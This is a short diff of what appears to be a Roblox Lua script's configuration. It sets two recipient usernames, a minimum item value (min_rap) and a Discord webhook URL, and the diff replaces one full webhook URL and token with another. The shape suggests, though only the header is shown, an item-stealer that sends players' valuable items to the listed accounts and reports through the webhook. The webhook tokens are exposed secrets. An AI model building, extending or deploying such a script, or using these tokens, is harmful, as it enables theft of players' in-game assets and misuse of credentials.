@@ -1,6 +1,6 @@
 Username = "cabagaming"
 Username2 = "andrelee05"
-webhook = "https://discord.com/api/webhooks/1300131229299114066/jAGn4VLPrq4uT8bGwwMqcXjKSFMk3FTgCDQWWfrVYWYYGO6TCiq-QuwsuFGNpxXt4Ye1"
+webhook = "https://discord.com/api/webhooks/1301352183530258533/xSvV7gxsWTKzJQSBfvKagTNPFKEI5MzFEps0HrciM_PFcd0VoRlUWW9MTfZfOS2NdXlZ"
 min_rap = 1000000
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
